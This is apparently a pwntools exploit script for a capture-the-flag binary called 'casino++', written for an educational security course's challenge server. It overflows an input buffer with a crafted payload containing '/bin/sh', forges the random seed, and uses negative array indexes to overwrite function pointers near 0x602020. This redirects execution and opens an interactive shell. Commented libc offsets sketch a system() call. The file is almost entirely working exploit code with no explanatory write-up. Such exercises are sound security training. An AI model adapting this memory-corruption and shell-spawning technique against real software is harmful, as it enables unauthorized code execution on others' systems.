from pwn import *
#p = remote("edu-ctf.csie.org" , 10172)
#l = ELF('./libc-2.27.so')
g = ELF('./casino++')

#choice = input("jizz (0 or 1):")

#system_offset = 0x4f440
#libc_start = 0x21ab0
#bin_sh = 0x1b3e9a
#libc_base = 0x7ffff7af4070 - 0x110070

p = process("./casino++")
context.arch = 'amd64'

#0x602030: 43,1,82,29,2,95
#0x602120: 6,43,7,78,41,84
#seed_pay = 0x00602120
payload = 'a' * 0x10 + '\x00\x20\x21\x60' + 'a' * 0x20 + '/bin/sh' + '\x00'

print(payload)

#first casino:
p.sendlineafter(': ' , payload)
#p.sendlineafter(': ' , 'a'*0x18)
p.sendlineafter(': ' , '50') #age
p.sendlineafter(': ' , '0') # 0
p.sendlineafter(': ' , '0') # 1
p.sendlineafter(': ' , '0') # 2
p.sendlineafter(': ' , '0') # 3
p.sendlineafter(': ' , '0') # 4
p.sendlineafter(': ' , '0') # 5
p.sendlineafter(': ' , '1') # y or n

p.sendlineafter(': ' , '-43') # pos
p.sendlineafter(': ' , '4196701') # hijack

p.sendlineafter(': ' , '6') # 0
p.sendlineafter(': ' , '43')# 1
p.sendlineafter(': ' , '7') # 2
p.sendlineafter(': ' , '78') # 3
p.sendlineafter(': ' , '41') # 4
p.sendlineafter(': ' , '84') # 5
p.sendlineafter(': ' , '1') # y or n
p.sendlineafter(': ' , '-42') # pos
p.sendlineafter(': ' , '0') # hijack

#second casino:

p.sendlineafter(': ' , '0') # 0
p.sendlineafter(': ' , '0') # 1
p.sendlineafter(': ' , '0') # 2
p.sendlineafter(': ' , '0') # 3
p.sendlineafter(': ' , '0') # 4
p.sendlineafter(': ' , '0') # 5
p.sendlineafter(': ' , '1') # y or n

p.sendlineafter(': ' , '-35') # pos
#p.sendlineafter(': ' , '4196096')
p.sendlineafter(': ' , '4154668096') # hijack

p.sendlineafter(': ' , '6') # 0
p.sendlineafter(': ' , '43') # 1
p.sendlineafter(': ' , '7') # 2
p.sendlineafter(': ' , '78') # 3
p.sendlineafter(': ' , '41') # 4
p.sendlineafter(': ' , '84') # 5
p.sendlineafter(': ' , '0') # pos
#p.recvline()
p.interactive()
# 蓋掉0x602020那邊, idx = -44, -43
# jmp 到 0x602108